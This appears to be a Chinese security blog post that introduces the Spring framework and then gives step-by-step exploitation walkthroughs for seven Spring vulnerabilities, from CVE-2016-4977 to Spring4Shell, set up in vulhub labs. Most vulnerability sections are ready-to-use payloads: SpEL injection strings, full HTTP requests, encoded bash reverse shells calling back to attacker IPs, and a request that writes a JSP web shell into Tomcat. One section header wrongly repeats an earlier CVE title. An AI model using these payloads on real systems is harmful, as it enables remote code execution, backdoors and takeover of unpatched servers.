## Spring简介

Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行管理的轻量级容器。Spring可以单独应用于构筑应用程序，也可以和Struts、Webwork、Tapestry等众多Web框架组合使用，并且可以与
Swing等桌面应用程序AP组合。

Spring框架主要由七部分组成，分别是 Spring Core、 Spring AOP、 Spring ORM、 Spring DAO、Spring
Context、 Spring Web和 Spring Web MVC

![1650095669_625a76353b06fcbbb26b1.png!small?1650095668839](https://image.3001.net/images/20220416/1650095669_625a76353b06fcbbb26b1.png!small?1650095668839)

Spring发展到现在，全家桶所包含的内容非常庞大，这里主要介绍其中关键的5个部分

  *  **1.Spring Framework**  
也就是我们经常说的spring框架，包括了ioc依赖注入，Context上下文、bean管理、springmvc等众多功能模块，其它spring项目比如spring
boot也会依赖spring框架。

  *  **2.springBoot**  
它的目标是简化Spring应用和服务的创建、开发与部署，简化了配置文件，使用嵌入式web服务器，含有诸多开箱即用的微服务功能，可以和spring
cloud联合部署。Spring Boot的核心思想是约定大于配置，应用只需要很少的配置即可，简化了应用开发模式。

  *  **3.Spring Data**  
是一个数据访问及操作的工具集，封装了多种数据源的操作能力，包括：jdbc、Redis、MongoDB等。

  *  **4.springCloud**  
是一套完整的微服务解决方案，是一系列不同功能的微服务框架的集合。Spring Cloud基于Spring
Boot，简化了分布式系统的开发，集成了服务发现、配置管理、消息总线、负载均衡、断路器、数据监控等各种服务治理能力。比如sleuth提供了全链路追踪能力，Netflix套件提供了hystrix熔断器、zuul网关等众多的治理组件。config组件提供了动态配置能力，bus组件支持使用RabbitMQ、kafka、Activemq等消息队列，实现分布式服务之间的事件通信。

  *  **5.Spring Security**  
主要用于快速构建安全的应用程序和服务，在Spring Boot和Spring Security
OAuth2的基础上，可以快速实现常见安全模型，如单点登录，令牌中继和令牌交换。你可以了解一下oauth2授权机制和jwt认证方式。oauth2是一种授权机制，规定了完备的授权、认证流程。JWT全称是JSON
Web Token，是一种把认证信息包含在token中的认证实现，oauth2授权机制中就可以应用jwt来作为认证的具体实现方法。

下图就直观表现了他们之间的关系。

![1650095339_625a74eb820d399d4d951.png!small?1650095339110](https://image.3001.net/images/20220416/1650095339_625a74eb820d399d4d951.png!small?1650095339110)

  

## Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）

漏洞原理：Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views
来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。

影响版本：

  * Spring Security OAuth 2.0 – 2.0.9
  * Spring Security OAuth 1.0 – 1.0.5

漏洞环境：[vulhub/README.zh-cn.md at master · vulhub/vulhub
(github.com)](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/README.zh-cn.md)

![1650176773_625bb3056cb6b866e7a5a.png!small?1650176773002](https://image.3001.net/images/20220417/1650176773_625bb3056cb6b866e7a5a.png!small?1650176773002)

访问路径/oauth/authorize，会看到左上角有个绿色叶子的标志，一般都是spring或者springboot![1650176791_625bb3176f24000fe7ed8.png!small?1650176790931](https://image.3001.net/images/20220417/1650176791_625bb3176f24000fe7ed8.png!small?1650176790931)

poc验证是否存在漏洞，首先需要填写用户名和密码，这里填入`admin:admin`即可。

    
    
    /oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test

![1650179024_625bbbd0c42b3c37863f2.png!small?1650179024355](https://image.3001.net/images/20220417/1650179024_625bbbd0c42b3c37863f2.png!small?1650179024355)

可以看到存在漏洞，接着反弹shell回来。

首先将反弹shell命令进行base64编码

    
    
    bash -i >& /dev/tcp/192.168.31.74/9999 0>&1

然后放入以下格式

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjc0Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}

使用工具再次进行编码[vulhub/poc.py at master · vulhub/vulhub
(github.com)](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py)注意需要使用python3

![1650178908_625bbb5ce8c36c11f05df.png!small](https://image.3001.net/images/20220417/1650178908_625bbb5ce8c36c11f05df.png!small)

![1650178908_625bbb5c7a10e088cb72c.png!small?1650178908012](https://image.3001.net/images/20220417/1650178908_625bbb5c7a10e088cb72c.png!small?1650178908012)

windows系统的poc如下

    
    
    http://localhost:8080/oauth/authorize? response_type=calc.exe${T(java.lang.Runtime).getRuntime().exec(toString().substring(112,120))}&client_id=secalert&scope=openid&redirect_uri=http://test

  

## Spring Web Flow 远程代码执行漏洞（CVE-2017-4971）

漏洞原理：Spring Web Flow (SWF) 是Spring Framework的一个脱离模块，
是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。该漏洞源于在Model的数据绑定上没有指定相关model的具体属性，从而导致恶意的表达式可以通过表单提交并且被执行，导致远程代码执行。

影响版本：Spring Web Flow 2.4.0 - 2.4.4

漏洞环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/spring/CVE-2017-4971/)

![1650184259_625bd0436c240472a81c5.png!small?1650184260464](https://image.3001.net/images/20220417/1650184259_625bd0436c240472a81c5.png!small?1650184260464)

点击左上角login进入登陆界面，用给出的任意一个账号/密码登录系统：

![1650185040_625bd350764259a7d3394.png!small?1650185041524](https://image.3001.net/images/20220417/1650185040_625bd350764259a7d3394.png!small?1650185041524)

随便点击一家酒店，然后按预订按钮“Book Hotel”，填写相关信息后点击“Process”（从这一步，WebFlow就正式开始了）：

![1650185077_625bd375c02d00ab06f0d.png!small?1650185078130](https://image.3001.net/images/20220417/1650185077_625bd375c02d00ab06f0d.png!small?1650185078130)

填写相关信息后确认抓包

![1650185511_625bd5278efb92e30890a.png!small?1650185511471](https://image.3001.net/images/20220417/1650185511_625bd5278efb92e30890a.png!small?1650185511471)

验证漏洞，执行成功后会如图所示，在 HTTP 返回头部中会多出 1_Ry字段

    
    
    &_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("1_Ry","True").aaa=n1nty
    

![1650187876_625bde64824eb73b8aea9.png!small?1650187876003](https://image.3001.net/images/20220417/1650187876_625bde64824eb73b8aea9.png!small?1650187876003)

反弹shell payload，注意里面的反弹shell语句是经过了url编码的

    
    
    &_T(java.lang.Runtime).getRuntime().exec("/bin/bash+-c+$%40|bash+0+echo+bash+-i+>%26/dev/tcp/192.168.31.74/9999+0>%261")
    或者
    &_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.31.74/9999+0>%261")).start()=test

![1650188355_625be0438de5fc1742954.png!small?1650188355088](https://image.3001.net/images/20220417/1650188355_625be0438de5fc1742954.png!small?1650188355088)

  

## Spring Messaging 远程命令执行漏洞（CVE-2018-1270）

漏洞原理：Spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS。在spring
messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用`StandardEvaluationContext`解析，造成命令执行漏洞。

影响版本：

  * Spring Framework 5.0 to 5.0.4.
  * Spring Framework 4.3 to 4.3.14

漏洞环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/spring/CVE-2018-1270/)

![1650259893_625cf7b502f0c90646e23.png!small?1650259891631](https://image.3001.net/images/20220418/1650259893_625cf7b502f0c90646e23.png!small?1650259891631)

利用脚本[vulhub/exploit.py at master · vulhub/vulhub
(github.com)](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py)（这个poc并不具有通用性）

    
    
    /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.31.74/9999 0>&1

![1650265389_625d0d2de70c2cb85cbf0.png!small?1650265388614](https://image.3001.net/images/20220418/1650265389_625d0d2de70c2cb85cbf0.png!small?1650265388614)

![1650265438_625d0d5eb99daffef2258.png!small?1650265437405](https://image.3001.net/images/20220418/1650265438_625d0d5eb99daffef2258.png!small?1650265437405)

其实这个漏洞我也不太懂怎么验证存不存在，具体分析可以参考这篇[spring-messaging 远程代码执行漏洞分析(CVE-2018-1270) - 知乎
(zhihu.com)](https://zhuanlan.zhihu.com/p/37269602)

  

## Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

漏洞原理：Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring
Data下所有子项目共享的基础框架。Spring Data Commons
在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

影响版本：

  * Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)
  * Spring Data Commons 2.0 to 2.0.5 (Kay SR5)
  * Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)
  * Spring Data REST 3.0 - 3.0.5 (Kay SR5)

漏洞环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/spring/CVE-2018-1273/)

访问http://your-ip:8080/users，可以看到一个注册界面

![1650282862_625d516e60174790ae918.png!small](https://image.3001.net/images/20220418/1650282862_625d516e60174790ae918.png!small)

点击注册抓包，payload放入请求体中（反弹shell语句经过了url编码）

    
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash+-c+$%40|bash+0+echo+bash+-i+>%26/dev/tcp/172.20.10.13/9999+0>%261")]=&password=&repeatedPassword=

![1650283323_625d533b702db31e14127.png!small?1650283322100](https://image.3001.net/images/20220418/1650283323_625d533b702db31e14127.png!small?1650283322100)

  

## Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）

漏洞原理：Spring Cloud
Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator
API的情况下，将可以利用该漏洞执行任意命令。

影响版本：

  * Spring Cloud Gateway 3.1.0
  * Spring Cloud Gateway 3.0.0 - 3.0.6
  * Spring Cloud Gateway 其他已不再更新的版本

漏洞环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/spring/CVE-2022-22947/)

![1650336906_625e248a799b137e61335.png!small?1650336904333](https://image.3001.net/images/20220419/1650336906_625e248a799b137e61335.png!small?1650336904333)

利用这个漏洞需要分多步。

首先，发送如下数据包即可添加一个包含恶意SpEL表达式的路由：

    
    
    POST /actuator/gateway/routes/1_Rytest HTTP/1.1
    Host: 192.168.31.74:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 329
    
    {
      "id": "1_Rytest",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }

![1650337462_625e26b600462bcd9d4af.png!small?1650337459754](https://image.3001.net/images/20220419/1650337462_625e26b600462bcd9d4af.png!small?1650337459754)

然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：

    
    
    POST /actuator/gateway/refresh HTTP/1.1
    Host: 192.168.31.74:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0  
      
    

![1650337532_625e26fc890ea4b849975.png!small?1650337530310](https://image.3001.net/images/20220419/1650337532_625e26fc890ea4b849975.png!small?1650337530310)

然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：

    
    
    GET /actuator/gateway/routes/1_Rytest HTTP/1.1
    Host: 192.168.31.74:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0  
      
    

![1650337775_625e27efbda42f1ecf561.png!small?1650337773547](https://image.3001.net/images/20220419/1650337775_625e27efbda42f1ecf561.png!small?1650337773547)

最后，发送如下数据包清理现场，删除所添加的路由：

    
    
    DELETE /actuator/gateway/routes/1_Rytest HTTP/1.1
    Host: 192.168.31.74:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    
    

![1650357948_625e76bc5130acd6b348b.png!small?1650357945668](https://image.3001.net/images/20220419/1650357948_625e76bc5130acd6b348b.png!small?1650357945668)

    
    
    POST /actuator/gateway/refresh HTTP/1.1
    Host: 192.168.31.74:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    
    

![1650358009_625e76f970cb94ac5cb88.png!small?1650358006839](https://image.3001.net/images/20220419/1650358009_625e76f970cb94ac5cb88.png!small?1650358006839)

验证看看，清理成功

![1650358031_625e770fb301e9255d90f.png!small?1650358029082](https://image.3001.net/images/20220419/1650358031_625e770fb301e9255d90f.png!small?1650358029082)

  

## Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）

漏洞原理：Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda
这样的 FaaS（函数即服务，function as a service）平台。当Spring Cloud Function
启用动态路由functionRouter时， HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。

影响版本：3 <= 版本 <= 3.2.2

漏洞环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/spring/CVE-2022-22963/)

启动一个使用Spring Cloud Function 3.2.2编写的服务器，服务启动后，执行`curl http://your-ip:8080/uppercase -H "Content-Type: text/plain" --data-binary
test`即可执行`uppercase`函数，将输入字符串转换成大写。

![1650371245_625eaaad3f1ea4778591c.png!small?1650371245324](https://image.3001.net/images/20220419/1650371245_625eaaad3f1ea4778591c.png!small?1650371245324)

发送如下数据包，`spring.cloud.function.routing-expression`头中包含的SpEL表达式将会被执行

    
    
    POST /functionRouter HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/172.20.10.13/9999 0>&1")
    Content-Type: text/plain
    Content-Length: 4
    
    test

![1650372001_625eada1768ca041673ad.png!small?1650372001798](https://image.3001.net/images/20220419/1650372001_625eada1768ca041673ad.png!small?1650372001798)

  

## Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）

漏洞原理：2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的
Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE)
的攻击。利⽤class对象构造利⽤链，对Tomcat的日志配置进行修改，然后，向⽇志中写⼊shell。

漏洞原理：

  * Apache Tomcat作为Servlet容器；
  * 使用JDK9及以上版本的Spring MVC框架；
  * Spring框架以及衍生的框架spring-beans-*.jar文件或者存在
  * CachedIntrospectionResults.class

影响版本：

  * Spring Framework < 5.3.18
  * Spring Framework < 5.2.20

漏洞环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/spring/CVE-2022-22965/)

![1650372649_625eb029984bdcf776715.png!small?1650372649630](https://image.3001.net/images/20220419/1650372649_625eb029984bdcf776715.png!small?1650372649630)

发送以下请求以更改Apache Tomcat中的日志记录配置，并将日志作为JSP文件写入：

    
    
    GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    suffix: %>//
    c1: Runtime
    c2: <%
    DNT: 1
    
    

![1650421972_625f70d4c1e2203390fa3.png!small?1650421972098](https://image.3001.net/images/20220420/1650421972_625f70d4c1e2203390fa3.png!small?1650421972098)

![1650422059_625f712b0f72d4f7cc42a.png!small?1650422058318](https://image.3001.net/images/20220420/1650422059_625f712b0f72d4f7cc42a.png!small?1650422058318)

![1650421133_625f6d8da07321b15da83.png!small?1650421132882](https://image.3001.net/images/20220420/1650421133_625f6d8da07321b15da83.png!small?1650421132882)

反弹shell ，/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.31.74/9999
0>&1（需要url编码）

![1650422820_625f74240aaf92f799d72.png!small?1650422819356](https://image.3001.net/images/20220420/1650422820_625f74240aaf92f799d72.png!small?1650422819356)

每次请求日志都会写入该文件，所以该文件会变得越来越大，发送以下请求以清除该属性：

    
    
    GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1
    Host: 192.168.31.74:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close  
      
    

利用工具

<https://codeload.github.com/BobTheShoplifter/Spring4Shell-POC/zip/refs/heads/main>

